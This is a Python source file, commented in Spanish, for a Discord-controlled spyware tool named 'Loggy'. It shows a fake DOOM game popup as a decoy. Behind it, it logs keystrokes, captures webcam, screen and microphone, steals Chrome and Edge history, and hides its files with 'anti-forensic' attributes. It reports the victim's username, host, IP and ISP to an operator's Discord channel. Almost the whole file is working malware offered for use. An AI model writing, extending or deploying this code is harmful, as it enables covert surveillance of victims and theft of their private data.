import discord
from discord.ext import commands
from discord.ui import Button, View
import cv2
import sounddevice as sd
from scipy.io.wavfile import write
import pyautogui
import os
import threading
import asyncio
import platform
import getpass
import requests
import socket
import ctypes
import sys
import pygetwindow as gw
import shutil 
import zipfile
from datetime import datetime
from pynput import keyboard
import mss
from docx import Document
import subprocess
import webbrowser
import tkinter as tk
from tkinter import messagebox
import io

# --- CONFIGURACIÓN ---
BOT_TOKEN = "TOKEN" #Ingresa tu Token
CHANNEL_ID = 0000000000000000 #Ingresa tu ID

# --- LÓGICA ANTI-FORENSE ---
def ocultar_archivo(ruta):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(ruta, 2)
    except:
        pass
    

# --- LÓGICA BROWSER STEALER ---
def robar_historial():
    user = getpass.getuser()
    base_path = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data"
    archivos_finales = []
    
    # Definimos qué carpetas buscar (las que encontraste con !perfiles)
    # Buscamos en Default y en cualquier carpeta que empiece con "Profile"
    subcarpetas = ["Default"]
    if os.path.exists(base_path):
        subcarpetas += [f for f in os.listdir(base_path) if f.startswith("Profile")]

    for carpeta in subcarpetas:
        ruta_historial = os.path.join(base_path, carpeta, "History")
        
        if os.path.exists(ruta_historial):
            # Le ponemos un nombre único para que no se sobrescriban en el ZIP
            temp_path = f"Chrome_{carpeta}_History_temp"
            try:
                shutil.copy2(ruta_historial, temp_path)
                archivos_finales.append(temp_path)
            except:
                continue
                
    # Hacemos lo mismo para Edge si quieres (opcional)
    ruta_edge = f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"
    if os.path.exists(ruta_edge):
        temp_edge = "Edge_History_temp"
        shutil.copy2(ruta_edge, temp_edge)
        archivos_finales.append(temp_edge)

    return archivos_finales

def listar_perfiles():
    user = getpass.getuser()
    ruta_chrome = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data"
    if os.path.exists(ruta_chrome):
        # Listamos carpetas como 'Default', 'Profile 1', etc.
        carpetas = [f for f in os.listdir(ruta_chrome) if os.path.isdir(os.path.join(ruta_chrome, f))]
        return carpetas
    return []

def lanzar_doom():
    try:
        # 1. Crear el mensaje de "regalo" o "sorpresa"
        root = tk.Tk()
        root.withdraw()
        root.attributes("-topmost", True)

        # Mensaje épico para que entren al juego sin dudar
        messagebox.showinfo("Retro Gaming Pack", "Old School Gaming Pack detected!\n\nLaunching DOOM (1993) in your browser... Enjoy!")

        # 2. Abrir DOOM en el navegador (una versión que carga rápido)
        # Esta URL es de una versión estable en JS
        url_doom = "https://dos.zone/doom-dec-1993/"
        webbrowser.open(url_doom)

        root.destroy()
    except:
        pass

# --- LÓGICA DE RECONOCIMIENTO (RECON) ---
def obtener_datos_red():
    datos = {}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        datos['ip_privada'] = s.getsockname()[0]
        s.close()
    except:
        datos['ip_privada'] = "No detectada"
    try:
        res = requests.get("http://ip-api.com/json/?fields=status,isp,query", timeout=5).json()
        if res["status"] == "success":
            datos['ip_publica'] = res["query"]
            datos['isp'] = res["isp"]
        else:
            datos['ip_publica'] = "Error"
            datos['isp'] = "Desconocido"
    except:
        datos['ip_publica'] = "Sin conexión"
        datos['isp'] = "Desconocido"
    return datos

# --- LÓGICA DEL KEYLOGGER ---
log_teclas = ""
log_acumulado_total = ""
contador_enter = 0
log_lock = threading.Lock()

def al_presionar(key):
    global log_teclas, contador_enter, log_acumulado_total
    tecla_actual = ""
    try:
        tecla_actual = key.char
        if tecla_actual is None: tecla_actual = ""
    except AttributeError:
        if key == keyboard.Key.space: tecla_actual = " "
        elif key == keyboard.Key.enter: tecla_actual = "\n"

    with log_lock:
        if tecla_actual:
            log_teclas += tecla_actual
            log_acumulado_total += tecla_actual
        if key == keyboard.Key.enter:
            contador_enter += 1
            if contador_enter >= 5:
                reporte = log_teclas
                log_teclas = ""
                contador_enter = 0
                try:
                    ventana = gw.getActiveWindowTitle()
                    if not ventana: ventana = "Ventana desconocida"
                except:
                    ventana = "Error al obtener ventana"

                if bot.is_ready():
                    canal = bot.get_channel(CHANNEL_ID)
                    if canal:
                        msg = f"📝 **Registro de Teclas**\n**Ventana:** `{ventana}`\n```\n{reporte[-1800:] if len(reporte) > 1800 else reporte}\n```"
                        bot.loop.create_task(canal.send(msg))

def iniciar_keylogger():
    with keyboard.Listener(on_press=al_presionar) as listener:
        listener.join()

threading.Thread(target=iniciar_keylogger, daemon=True).start()

# --- PANEL DE CONTROL (ACTUALIZADO) ---
class PanelControl(View):
    def __init__(self, bot_instance):
        super().__init__(timeout=None)
        self.bot = bot_instance

    @discord.ui.button(label="Cámara", style=discord.ButtonStyle.success, emoji="📷")
    async def captura_camara(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        cam = cv2.VideoCapture(0)
        for _ in range(5): cam.read()
        ret, frame = cam.read()
        if ret:
            path = "cam.png"
            cv2.imwrite(path, frame)
            ocultar_archivo(path)
            await interaction.channel.send(file=discord.File(path))
            os.remove(path)
        cam.release()

    @discord.ui.button(label="Pantalla", style=discord.ButtonStyle.primary, emoji="🖥️")
    # Añadimos 'button' como tercer argumento
    async def captura_pantalla(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                sct_img = sct.grab(monitor)
                img_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
                
                with io.BytesIO(img_bytes) as image_binary:
                    image_binary.seek(0)
                    await interaction.channel.send(
                        content=f"📸 **Captura de:** `{getpass.getuser()}`",
                        file=discord.File(fp=image_binary, filename="screenshot.png")
                    )
        except Exception as e:
            await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)
    
    @discord.ui.button(label="Audio", style=discord.ButtonStyle.danger, emoji="🎤")
    async def grabar_audio(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        fs, segundos, path = 44100, 5, "audio.wav"
        grabacion = sd.rec(int(segundos * fs), samplerate=fs, channels=1)
        await asyncio.sleep(segundos + 0.5)
        write(path, fs, grabacion)
        ocultar_archivo(path)
        await interaction.followup.send("✅ Audio:", file=discord.File(path))
        os.remove(path)

# --- PANEL AVANZADO (NUEVO) ---
class PanelAvanzado(View):
    def __init__(self, bot_instance):
        super().__init__(timeout=None)
        self.bot = bot_instance

    @discord.ui.button(label="Generar Word", style=discord.ButtonStyle.success, emoji="📄")
    async def generar_word_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        global log_acumulado_total
        path = "Daily_Digest.docx"
        doc = Document()
        doc.add_heading('Loggy Daily Digest', 0)
        doc.add_paragraph(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        doc.add_paragraph(f"Usuario: {getpass.getuser()}")
        doc.add_heading('Contenido capturado:', level=1)
        with log_lock:
            contenido = log_acumulado_total if log_acumulado_total else "Sin actividad registrada."
            doc.add_paragraph(contenido)
        doc.save(path)
        ocultar_archivo(path)
        await interaction.channel.send("📄 **Resumen de actividad generado:**", file=discord.File(path))
        os.remove(path)

    @discord.ui.button(label="Robar Browser", style=discord.ButtonStyle.secondary, emoji="🕵️")
    async def robar_browser_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        archivos = robar_historial()
        if archivos:
            zip_path = "exfiltracion_avanzada.zip"
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for f in archivos:
                    zipf.write(f)
                    os.remove(f)
            ocultar_archivo(zip_path)
            await interaction.channel.send(f"📦 **Exfiltración de Navegadores:**", file=discord.File(zip_path))
            os.remove(zip_path)
        else:
            await interaction.followup.send("❌ No se encontró historial accesible.", ephemeral=True)
            
    

# --- BOT ---
class LoggiBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=discord.Intents.all())

    async def on_ready(self):
        await asyncio.sleep(5)
        print(f"✅ Online: {self.user.name}")
        canal = self.get_channel(CHANNEL_ID)
        if canal:
            red = obtener_datos_red()
            embed = discord.Embed(
                title="🚀 Objetivo Online - Reporte de Red",
                description=(
                    f"**Identidad:**\n• User: `{getpass.getuser()}`\n• Host: `{platform.node()}`\n\n"
                    f"**Red WAN:**\n• IP Pública: `{red['ip_publica']}`\n• ISP: `{red['isp']}`\n\n"
                    f"**Red LAN:**\n• IP Privada: `{red['ip_privada']}`"
                ),
                color=discord.Color.blue(),
                timestamp=datetime.utcnow()
            )
            await canal.send(embed=embed)

bot = LoggiBot()

@bot.command()
async def panel(ctx):
    embed = discord.Embed(title="Panel Operativo Loggy", description="Acciones de monitoreo básicas.", color=0x2b2d31)
    view = PanelControl(bot)
    await ctx.send(embed=embed, view=view)

@bot.command()
async def avanzado(ctx):
    embed = discord.Embed(title="🔥 Panel Avanzado", description="Herramientas de exfiltración de datos.", color=0xff0000)
    embed.set_footer(text="Acceso Restringido - Loggy Pro")
    view = PanelAvanzado(bot)
    await ctx.send(embed=embed, view=view)

@bot.command()
async def perfiles(ctx):
    lista = listar_perfiles()
    if lista:
        # Filtramos para mostrar solo las que suelen tener datos
        importantes = [c for c in lista if "Default" in c or "Profile" in c]
        msg = f"📂 **Perfiles de Chrome encontrados:**\n`{', '.join(importantes)}`"
        await ctx.send(msg)
    else:
        await ctx.send("❌ No se encontró la ruta de Chrome.")

# --- MODIFICACIÓN FINAL EN EL IF NAME ---
if __name__ == "__main__":
    # Lanzamos el Doom mientras el bot hace su trabajo sucio
    threading.Thread(target=lanzar_doom, daemon=True).start()
    
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"Error: {e}")
